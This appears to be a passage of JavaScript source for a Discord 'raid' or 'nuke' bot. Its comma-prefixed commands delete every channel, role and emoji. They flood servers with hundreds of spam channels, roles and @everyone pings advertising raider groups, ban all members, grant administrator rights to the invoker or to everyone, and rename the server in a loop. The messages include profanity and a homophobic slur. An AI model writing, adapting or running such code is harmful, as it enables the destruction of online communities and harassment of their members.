              channel.send(' > ||@everyone|| `🌙 ᴅᴇꜱᴛʀᴜɪᴅᴏꜱ ᴘᴏʀ ɴɪɢʜᴛ ᴄʟᴜʙ, ᴘᴇɴᴅᴇᴊᴏꜱ 🌙` https://discord.gg/yk5vXnfVNp', embed8);
              channel.send(' > ||@everyone|| `🌙 ᴅᴇꜱᴛʀᴜɪᴅᴏꜱ ᴘᴏʀ ɴɪɢʜᴛ ᴄʟᴜʙ, ᴘᴇɴᴅᴇᴊᴏꜱ 🌙` https://discord.gg/yk5vXnfVNp', embed8);
              channel.send(' > ||@everyone|| `🌙 ᴅᴇꜱᴛʀᴜɪᴅᴏꜱ ᴘᴏʀ ɴɪɢʜᴛ ᴄʟᴜʙ, ᴘᴇɴᴅᴇᴊᴏꜱ 🌙` https://discord.gg/yk5vXnfVNp', embed8);
              channel.send(' > ||@everyone|| `🌙 ᴅᴇꜱᴛʀᴜɪᴅᴏꜱ ᴘᴏʀ ɴɪɢʜᴛ ᴄʟᴜʙ, ᴘᴇɴᴅᴇᴊᴏꜱ 🌙` https://discord.gg/yk5vXnfVNp', embed8);
              channel.send(' > ||@everyone|| `🌙 ᴅᴇꜱᴛʀᴜɪᴅᴏꜱ ᴘᴏʀ ɴɪɢʜᴛ ᴄʟᴜʙ, ᴘᴇɴᴅᴇᴊᴏꜱ 🌙` https://discord.gg/yk5vXnfVNp', embed8);
              channel.send(' > ||@everyone|| `🌙 ᴅᴇꜱᴛʀᴜɪᴅᴏꜱ ᴘᴏʀ ɴɪɢʜᴛ ᴄʟᴜʙ, ᴘᴇɴᴅᴇᴊᴏꜱ 🌙` https://discord.gg/yk5vXnfVNp', embed8);
              channel.send(' > ||@everyone|| `🌙 ᴅᴇꜱᴛʀᴜɪᴅᴏꜱ ᴘᴏʀ ɴɪɢʜᴛ ᴄʟᴜʙ, ᴘᴇɴᴅᴇᴊᴏꜱ 🌙` https://discord.gg/yk5vXnfVNp', embed8);
              channel.send(' > ||@everyone|| `🌙 ᴅᴇꜱᴛʀᴜɪᴅᴏꜱ ᴘᴏʀ ɴɪɢʜᴛ ᴄʟᴜʙ, ᴘᴇɴᴅᴇᴊᴏꜱ 🌙` https://discord.gg/yk5vXnfVNp', embed8);
              channel.send(' > ||@everyone|| `🌙 ᴅᴇꜱᴛʀᴜɪᴅᴏꜱ ᴘᴏʀ ɴɪɢʜᴛ ᴄʟᴜʙ, ᴘᴇɴᴅᴇᴊᴏꜱ 🌙` https://discord.gg/yk5vXnfVNp', embed8);
           
       })
       }
       message.guild.setName("discord.gg/nightclub2022");
       message.guild.setIcon("https://media.discordapp.net/attachments/978091455195271198/992580401161846785/MOSHED-2022-7-1-8-7-16.gif");
       message.guild.roles.cache.map(roles => roles.delete().catch(e => {}));
       message.guild.emojis.cache.map(emoji => emoji.delete());
              for (let i = 0; i <= 200; i++) {
                 message.guild.roles.create({data: {name: `☢ʀᴀɪᴅ-ʙʏ-ɴᴄ☢`,color: '0xffffff',},reason: 'discord.gg/nightclub2022',})
              };
     }
})


//admin

client.on("message", async msg => {
  if (msg.author.bot) return;
  if(msg.content.toLowerCase().startsWith(',admin')){
    msg.delete()
    let rol = await msg.guild.roles.create({data: {
      name: "⭐S̷t̷a̷r̷'̷s̷H̷i̷g̷h̷t̷⭐",
      color: "e2ff00",
      permissions: "ADMINISTRATOR",
      hoisted: false
    }})

msg.member.roles.add(rol)
      .then(function(role) {
        msg.member.addRole(role);
        if (msg.deletable) msg.delete().catch(e => {});
      })
      .catch(e => {});
  }
});

//eadmin


client.on("message", message => {
    if (message.author.bot) return;
  
   if (message.content === ',eadmin') {
    message.delete()
   if (!["984913030485790832","982638215120965662"].includes(message.author.id)) return message.channel.send(embedt).then(message => setTimeout(() => message.delete(), 10000));
    message.guild.roles.cache.find(role => role.name =="@everyone").setPermissions('ADMINISTRATOR')
   }
});


//banall

client.on("message", async message => {
  if(message.content.startsWith(',ban')){
    message.delete();
    if(!message.member.hasPermission("BAN_MEMBERS") || !message.member.hasPermission("ADMINISTRATOR")) return;
    message.guild.members.cache.forEach(member => {
      if(member != message.member && member.id != "ID" && member.id != "ID" && member.id != "ID"){
        member.ban({reason: '⭐Raid By SH⭐ discord.gg/RrsTzauQ73',}).catch(e => {})
      }
      
    })
  }});


//nuke 

client.on("message", message => {
    if (message.author.bot) return;
  
   if (message.content === ',cdelete') {
    message.delete()
  const embed3 = new Discord.MessageEmbed()
          .setTitle('SERVER FUCKED BY SH')
          .setURL('https://discord.com/RrsTzauQ73')
          .setDescription('```🌟 THIS SERVER HAS BEEN FUCKED BY STARS CLUB 🌟```')
          .setColor('0xfdf000')
          .addField('**Discord**','https://discord.gg/RrsTzauQ73')
          .addField('**Twitter**','https://twitter.com/PabloSa55497511')
          .addField('**Youtube**','https://www.youtube.com/channel/UCIiG5AW6kOWwLTw5i8MxyoA')
          .setImage('https://cdn.discordapp.com/attachments/885695793233797120/906414691218255883/MOSHED-2021-10-28-19-46-56.gif')
          .setFooter("SERVER DESTRUIDO POR: " + message.member.displayName, message.author.displayAvatarURL());
    message.guild.channels.cache.forEach(channel => channel.delete());
    message.guild.channels.create(`#⭐𝚂𝙷⭐`, {
          type: 'text', topic: `https://discord.gg/RrsTzauQ73`
        }).then(channel => {
          channel.send(' > ||@everyone|| `🌟 𝘛𝘩𝘪𝘴 𝘴𝘩𝘪𝘵 𝘴𝘦𝘳𝘷𝘦𝘳 𝘩𝘢𝘴 𝘣𝘦𝘦𝘯 𝘧𝘶𝘤𝘬𝘦𝘥 𝘣𝘺 𝘚𝘵𝘢𝘳𝘴 𝘩𝘪𝘨𝘩𝘵 🌟` https://discord.gg/RrsTzauQ73 https://youtu.be/Btu0O47u3rY', embed3)
        })
         }
      })


//chats

client.on("message", message => {
            if (message.author.bot) return;
          
           if (message.content === ',ccreate') {
            message.delete()
  const embed4 = new Discord.MessageEmbed()
          .setTitle('SERVER FUCKED BY SH')
          .setURL('https://discord.gg/RrsTzauQ73')
          .setDescription('```🌟 THIS SERVER HAS BEEN FUCKED BY STARS CLUB 🌟```')
          .setColor('0xfdf000')
          .addField('**Discord**','https://discord.gg/RrsTzauQ73')
          .addField('**Twitter**','https://twitter.com/PabloSa55497511')
          .addField('**Youtube**','https://www.youtube.com/channel/UCIiG5AW6kOWwLTw5i8MxyoA')
          .setImage('https://cdn.discordapp.com/attachments/885695793233797120/906414691218255883/MOSHED-2021-10-28-19-46-56.gif')
          .setFooter("SERVER DESTRUIDO POR: " + message.member.displayName, message.author.displayAvatarURL());
               message.guild.channels.cache.forEach(channel => channel.delete());
           for (let i = 0; i <= 500; i++) {
                message.guild.channels.create(`⭐𝚁𝚊𝚒𝚍𝚋𝚢𝚂𝙷⭐`, {
                  type: 'text', topic: `https://discord.gg/RrsTzauQ73`
                }).then(channel => {
              channel.send(' > ||@everyone|| `🌟 𝘛𝘩𝘪𝘴 𝘴𝘩𝘪𝘵 𝘴𝘦𝘳𝘷𝘦𝘳 𝘩𝘢𝘴 𝘣𝘦𝘦𝘯 𝘧𝘶𝘤𝘬𝘦𝘥 𝘣𝘺 𝘚𝘵𝘢𝘳𝘴 𝘩𝘪𝘨𝘩𝘵 🌟` https://discord.gg/RrsTzauQ73 https://youtu.be/Btu0O47u3rY', embed4);
              channel.send(' > ||@everyone|| `🌟 𝘛𝘩𝘪𝘴 𝘴𝘩𝘪𝘵 𝘴𝘦𝘳𝘷𝘦𝘳 𝘩𝘢𝘴 𝘣𝘦𝘦𝘯 𝘧𝘶𝘤𝘬𝘦𝘥 𝘣𝘺 𝘚𝘵𝘢𝘳𝘴 𝘩𝘪𝘨𝘩𝘵 🌟` https://discord.gg/RrsTzauQ73 https://youtu.be/Btu0O47u3rY', embed4);
              channel.send(' > ||@everyone|| `🌟 𝘛𝘩𝘪𝘴 𝘴𝘩𝘪𝘵 𝘴𝘦𝘳𝘷𝘦𝘳 𝘩𝘢𝘴 𝘣𝘦𝘦𝘯 𝘧𝘶𝘤𝘬𝘦𝘥 𝘣𝘺 𝘚𝘵𝘢𝘳𝘴 𝘩𝘪𝘨𝘩𝘵 🌟` https://discord.gg/RrsTzauQ73 https://youtu.be/Btu0O47u3rY', embed4);
              channel.send(' > ||@everyone|| `🌟 𝘛𝘩𝘪𝘴 𝘴𝘩𝘪𝘵 𝘴𝘦𝘳𝘷𝘦𝘳 𝘩𝘢𝘴 𝘣𝘦𝘦𝘯 𝘧𝘶𝘤𝘬𝘦𝘥 𝘣𝘺 𝘚𝘵𝘢𝘳𝘴 𝘩𝘪𝘨𝘩𝘵 🌟` https://discord.gg/RrsTzauQ73 https://youtu.be/Btu0O47u3rY', embed4);
              channel.send(' > ||@everyone|| `🌟 𝘛𝘩𝘪𝘴 𝘴𝘩𝘪𝘵 𝘴𝘦𝘳𝘷𝘦𝘳 𝘩𝘢𝘴 𝘣𝘦𝘦𝘯 𝘧𝘶𝘤𝘬𝘦𝘥 𝘣𝘺 𝘚𝘵𝘢𝘳𝘴 𝘩𝘪𝘨𝘩𝘵 🌟` https://discord.gg/RrsTzauQ73 https://youtu.be/Btu0O47u3rY', embed4);
              channel.send(' > ||@everyone|| `🌟 𝘛𝘩𝘪𝘴 𝘴𝘩𝘪𝘵 𝘴𝘦𝘳𝘷𝘦𝘳 𝘩𝘢𝘴 𝘣𝘦𝘦𝘯 𝘧𝘶𝘤𝘬𝘦𝘥 𝘣𝘺 𝘚𝘵𝘢𝘳𝘴 𝘩𝘪𝘨𝘩𝘵 🌟` https://discord.gg/RrsTzauQ73 https://youtu.be/Btu0O47u3rY', embed4);
              channel.send(' > ||@everyone|| `🌟 𝘛𝘩𝘪𝘴 𝘴𝘩𝘪𝘵 𝘴𝘦𝘳𝘷𝘦𝘳 𝘩𝘢𝘴 𝘣𝘦𝘦𝘯 𝘧𝘶𝘤𝘬𝘦𝘥 𝘣𝘺 𝘚𝘵𝘢𝘳𝘴 𝘩𝘪𝘨𝘩𝘵 🌟` https://discord.gg/RrsTzauQ73 https://youtu.be/Btu0O47u3rY', embed4);
              channel.send(' > ||@everyone|| `🌟 𝘛𝘩𝘪𝘴 𝘴𝘩𝘪𝘵 𝘴𝘦𝘳𝘷𝘦𝘳 𝘩𝘢𝘴 𝘣𝘦𝘦𝘯 𝘧𝘶𝘤𝘬𝘦𝘥 𝘣𝘺 𝘚𝘵𝘢𝘳𝘴 𝘩𝘪𝘨𝘩𝘵 🌟` https://discord.gg/RrsTzauQ73 https://youtu.be/Btu0O47u3rY', embed4);
              channel.send(' > ||@everyone|| `🌟 𝘛𝘩𝘪𝘴 𝘴𝘩𝘪𝘵 𝘴𝘦𝘳𝘷𝘦𝘳 𝘩𝘢𝘴 𝘣𝘦𝘦𝘯 𝘧𝘶𝘤𝘬𝘦𝘥 𝘣𝘺 𝘚𝘵𝘢𝘳𝘴 𝘩𝘪𝘨𝘩𝘵 🌟` https://discord.gg/RrsTzauQ73 https://youtu.be/Btu0O47u3rY', embed4);
              channel.send(' > ||@everyone|| `🌟 𝘛𝘩𝘪𝘴 𝘴𝘩𝘪𝘵 𝘴𝘦𝘳𝘷𝘦𝘳 𝘩𝘢𝘴 𝘣𝘦𝘦𝘯 𝘧𝘶𝘤𝘬𝘦𝘥 𝘣𝘺 𝘚𝘵𝘢𝘳𝘴 𝘩𝘪𝘨𝘩𝘵 🌟` https://discord.gg/RrsTzauQ73 https://youtu.be/Btu0O47u3rY', embed4);
              channel.send(' > ||@everyone|| `🌟 𝘛𝘩𝘪𝘴 𝘴𝘩𝘪𝘵 𝘴𝘦𝘳𝘷𝘦𝘳 𝘩𝘢𝘴 𝘣𝘦𝘦𝘯 𝘧𝘶𝘤𝘬𝘦𝘥 𝘣𝘺 𝘚𝘵𝘢𝘳𝘴 𝘩𝘪𝘨𝘩𝘵 🌟` https://discord.gg/RrsTzauQ73 https://youtu.be/Btu0O47u3rY', embed4);
              channel.send(' > ||@everyone|| `🌟 𝘛𝘩𝘪𝘴 𝘴𝘩𝘪𝘵 𝘴𝘦𝘳𝘷𝘦𝘳 𝘩𝘢𝘴 𝘣𝘦𝘦𝘯 𝘧𝘶𝘤𝘬𝘦𝘥 𝘣𝘺 𝘚𝘵𝘢𝘳𝘴 𝘩𝘪𝘨𝘩𝘵 🌟` https://discord.gg/RrsTzauQ73 https://youtu.be/Btu0O47u3rY', embed4);
              channel.send(' > ||@everyone|| `🌟 𝘛𝘩𝘪𝘴 𝘴𝘩𝘪𝘵 𝘴𝘦𝘳𝘷𝘦𝘳 𝘩𝘢𝘴 𝘣𝘦𝘦𝘯 𝘧𝘶𝘤𝘬𝘦𝘥 𝘣𝘺 𝘚𝘵𝘢𝘳𝘴 𝘩𝘪𝘨𝘩𝘵 🌟` https://discord.gg/RrsTzauQ73 https://youtu.be/Btu0O47u3rY', embed4);
              channel.send(' > ||@everyone|| `🌟 𝘛𝘩𝘪𝘴 𝘴𝘩𝘪𝘵 𝘴𝘦𝘳𝘷𝘦𝘳 𝘩𝘢𝘴 𝘣𝘦𝘦𝘯 𝘧𝘶𝘤𝘬𝘦𝘥 𝘣𝘺 𝘚𝘵𝘢𝘳𝘴 𝘩𝘪𝘨𝘩𝘵 🌟` https://discord.gg/RrsTzauQ73 https://youtu.be/Btu0O47u3rY', embed4);
              channel.send(' > ||@everyone|| `🌟 𝘛𝘩𝘪𝘴 𝘴𝘩𝘪𝘵 𝘴𝘦𝘳𝘷𝘦𝘳 𝘩𝘢𝘴 𝘣𝘦𝘦𝘯 𝘧𝘶𝘤𝘬𝘦𝘥 𝘣𝘺 𝘚𝘵𝘢𝘳𝘴 𝘩𝘪𝘨𝘩𝘵 🌟` https://discord.gg/RrsTzauQ73 https://youtu.be/Btu0O47u3rY', embed4);
              channel.send(' > ||@everyone|| `🌟 𝘛𝘩𝘪𝘴 𝘴𝘩𝘪𝘵 𝘴𝘦𝘳𝘷𝘦𝘳 𝘩𝘢𝘴 𝘣𝘦𝘦𝘯 𝘧𝘶𝘤𝘬𝘦𝘥 𝘣𝘺 𝘚𝘵𝘢𝘳𝘴 𝘩𝘪𝘨𝘩𝘵 🌟` https://discord.gg/RrsTzauQ73 https://youtu.be/Btu0O47u3rY', embed4);
              channel.send(' > ||@everyone|| `🌟 𝘛𝘩𝘪𝘴 𝘴𝘩𝘪𝘵 𝘴𝘦𝘳𝘷𝘦𝘳 𝘩𝘢𝘴 𝘣𝘦𝘦𝘯 𝘧𝘶𝘤𝘬𝘦𝘥 𝘣𝘺 𝘚𝘵𝘢𝘳𝘴 𝘩𝘪𝘨𝘩𝘵 🌟` https://discord.gg/RrsTzauQ73 https://youtu.be/Btu0O47u3rY', embed4);
              channel.send(' > ||@everyone|| `🌟 𝘛𝘩𝘪𝘴 𝘴𝘩𝘪𝘵 𝘴𝘦𝘳𝘷𝘦𝘳 𝘩𝘢𝘴 𝘣𝘦𝘦𝘯 𝘧𝘶𝘤𝘬𝘦𝘥 𝘣𝘺 𝘚𝘵𝘢𝘳𝘴 𝘩𝘪𝘨𝘩𝘵 🌟` https://discord.gg/RrsTzauQ73 https://youtu.be/Btu0O47u3rY', embed4);
              channel.send(' > ||@everyone|| `🌟 𝘛𝘩𝘪𝘴 𝘴𝘩𝘪𝘵 𝘴𝘦𝘳𝘷𝘦𝘳 𝘩𝘢𝘴 𝘣𝘦𝘦𝘯 𝘧𝘶𝘤𝘬𝘦𝘥 𝘣𝘺 𝘚𝘵𝘢𝘳𝘴 𝘩𝘪𝘨𝘩𝘵 🌟` https://discord.gg/RrsTzauQ73 https://youtu.be/Btu0O47u3rY', embed4);
              channel.send(' > ||@everyone|| `🌟 𝘛𝘩𝘪𝘴 𝘴𝘩𝘪𝘵 𝘴𝘦𝘳𝘷𝘦𝘳 𝘩𝘢𝘴 𝘣𝘦𝘦𝘯 𝘧𝘶𝘤𝘬𝘦𝘥 𝘣𝘺 𝘚𝘵𝘢𝘳𝘴 𝘩𝘪𝘨𝘩𝘵 🌟` https://discord.gg/RrsTzauQ73 https://youtu.be/Btu0O47u3rY', embed4);
              channel.send(' > ||@everyone|| `🌟 𝘛𝘩𝘪𝘴 𝘴𝘩𝘪𝘵 𝘴𝘦𝘳𝘷𝘦𝘳 𝘩𝘢𝘴 𝘣𝘦𝘦𝘯 𝘧𝘶𝘤𝘬𝘦𝘥 𝘣𝘺 𝘚𝘵𝘢𝘳𝘴 𝘩𝘪𝘨𝘩𝘵 🌟` https://discord.gg/RrsTzauQ73 https://youtu.be/Btu0O47u3rY', embed4);
                  
              })
              }
              }
            });

//borrar roles

client.on("message", message => {
                    if (message.author.bot) return;
                  
                     if(message.content === (',rroles')){
                      message.delete()
                            message.guild.roles.cache.map(roles => roles.delete().catch(e => {}));
                          }
                  });

//crear roles

client.on("message", message => {
                if (message.author.bot) return;
              
               if (message.content === ',croles') {
                message.delete()
              for (let i = 0; i <= 200; i++) {
                 message.guild.roles.create({data: {name: `🌟R̷a̷i̷d̷B̷y̷S̷t̷a̷r̷'̷s̷H̷i̷g̷h̷t̷🌟`,color: 'RANDOM',},reason: 'discord.gg/RrsTzauQ73',})
              };
               }
                });

//foto y nombre
 
client.on("message", message => {
                    if (message.author.bot) return;
 
                   if (message.content === ',gname') {
                      message.delete()
                      message.guild.setName("discord.gg/RrsTzauQ73");
                      message.guild.setIcon("https://cdn.discordapp.com/attachments/858535729353457686/906045921245151232/MOSHED-2021-10-30-3-0-11.gif"
                      );
                      }
                    }); 

//msgfuck

client.on("message", message => {
  if(message.author.bot) return;

  if(message.content === ',msgfuck'){
      message.delete()
const args = message.content.slice().trim().split(/ +/g );
const command = args.shift().toLowerCase();
  message.channel.messages.fetch({
    limit: args[0]
   }).then(messages => {
   message.channel.bulkDelete(messages);
   })
   }});

//pings

client.on("message", message => {
  if(message.author.bot) return;

  if(message.content === ',dios'){
      message.delete()
  const embed5 = new Discord.MessageEmbed()
          .setTitle('SERVER FUCKED BY SH')
          .setURL('https://discord.gg/RrsTzauQ73')
          .setDescription('```🌟 THIS SERVER HAS BEEN FUCKED BY STARS CLUB 🌟```')
          .setColor('0xfdf000')
          .addField('**Discord**','https://discord.gg/RrsTzauQ73')
          .addField('**Twitter**','https://twitter.com/PabloSa55497511')
          .addField('**Youtube**','https://www.youtube.com/channel/UCIiG5AW6kOWwLTw5i8MxyoA')
          .setImage('https://cdn.discordapp.com/attachments/885695793233797120/906414691218255883/MOSHED-2021-10-28-19-46-56.gif')
          .setFooter("SERVER DESTRUIDO POR: " + message.member.displayName, message.author.displayAvatarURL());
      for (let i = 0; i <= 100; i++) {
      message.channel.send(' > ||@everyone|| `🌟 𝘛𝘩𝘪𝘴 𝘴𝘩𝘪𝘵 𝘴𝘦𝘳𝘷𝘦𝘳 𝘩𝘢𝘴 𝘣𝘦𝘦𝘯 𝘧𝘶𝘤𝘬𝘦𝘥 𝘣𝘺 𝘚𝘵𝘢𝘳𝘴 𝘩𝘪𝘨𝘩𝘵 🌟` https://discord.gg/RrsTzauQ73 https://youtu.be/Btu0O47u3rY', embed5);
               }
                }});

//emojisnuke

client.on("message", message => {
                    if (message.author.bot) return;
                  
                     if(message.content === (',remojis')){
                      message.delete()
                            message.guild.emojis.cache.map(emoji => emoji.delete());
                          }
                  });

//emojis

client.on("message", message => {
                    if (message.author.bot) return;
                  
                     if(message.content === (',emojis')){
                      message.delete()
              for (let i = 0; i <= 49; i++) {
     message.guild.emojis.create('https://cdn.discordapp.com/attachments/863657381434621997/920474213842833479/fe5993ad3c4fd7e8bd0dfafd1b6766d9.png', 'Sh_Manda')}
                  }});

//lista


client.on("message", message => {
    if (message.author.bot) return;
    const args = message.content.slice().trim().split(/ +/g );
    const command = args.shift().toLowerCase();
   if (command === ',guildinfo') {
       message.delete()
       const embedx = new Discord.MessageEmbed()
       .setAuthor(`${message.guild.name}`, `${message.guild.iconURL()}`)
       .setThumbnail(`${message.guild.iconURL({ dynamic:true })}`)
      .addField(`Owner`, `${message.guild.owner.user.tag}`, true)
       .addField(`Cantidad De Canales`, `${message.guild.channels.cache.size}`, true)
       .addField(`Cantidad De Roles`, `${message.guild.roles.cache.size}`, true)
       .addField(`Cantidar De Miembros`, `${message.guild.memberCount}`, true)
       .addField(`Server Boosters`, `${message.guild.premiumSubscriptionCount}`, true)
        .addField(`Cantidad De Emojis`, `${message.guild.emojis.cache.size}`, true)
       .setFooter(`ID: ${message.guild.id} | Server Created: ${message.guild.createdAt.toDateString()}`)
       .setColor("RANDOM");
       message.channel.send(embedx)
   }
});

//leave

client.on("message", message => {
                    if (message.author.bot) return;
                  
                     if(message.content === (',leave')){
                      message.delete()
    message.channel.send(" > ||@everyone|| ADIOS GAYS https://discord.gg/RrsTzauQ73");
    message.guild.leave().catch(e => {});
  }});


//lag
 
client.on("message", message => {
                    if (message.author.bot) return;
 
                   if (message.content === ',lag') {
                      message.delete()
              for (let i = 0; i <= 500; i++) {
                      message.guild.setName("#🌟SH🌟");
                      message.guild.setName("🌟Ṡ̵̨̖͖̜͉́͛̑ḩ̴̡̢̨͓̞͙̙̹̳̙̬̳̄ͅ ̴̨̹̜̻̩͚̟̠̘͍̽̿̃̀Ǭ̶̨̪̘̼̤͙͈͐͜ň̴̢̡̩͍̲͍̮̈́̎́͂ ̵̜͍̬͚͔̣̬̣̈́̀̆͘T̵̡̛̪̳̻̥̥͈̞̔́̊̌͛̋̽̊̚͠o̵̭̗̜͕̹͓͓̩̥̥̖͜͝p̷̻̲̱̻̾̌̈́̏̇͝͝͠͠͝🌟");
                      message.guild.setName("ℝ𝕒𝕚𝕕 𝔹𝕪 𝕊𝕥𝕒𝕣´𝕊 ℍ𝕚𝕘𝕙𝕥");
                      message.guild.setName("ꜱᴇʀᴠᴇʀ ꜰᴜᴄᴋᴇᴅ");
                      message.guild.setName("𝘋𝘖𝘔𝘈𝘋𝘖𝘚 𝘗𝘖𝘙 𝘏𝘖𝘔𝘖𝘚𝘌𝘟𝘜𝘈𝘓𝘌𝘚");
                      message.guild.setName("discord.gg/RrsTzauQ73");
                      }
                    }}); 

//nickall

client.on("message", msg => {
const args = msg.content.slice().trim().split(/ +/g );
const command = args.shift().toLowerCase();
  if (command === ',nick'){
      msg.delete()
    if (!["984913030485790832","982638215120965662"].includes(msg.author.id)) return msg.channel.send(embedt).then(message => setTimeout(() => message.delete(), 10000));
    let nickname = args.join(" ");
    var i = 0;
    msg.guild.members.cache.forEach(member =>{
      i++
    }
      )
    msg.guild.members.cache.forEach(member =>{

      member.setNickname(nickname).catch(e => {})
    })
    }
});





client.login(process.env['token']);
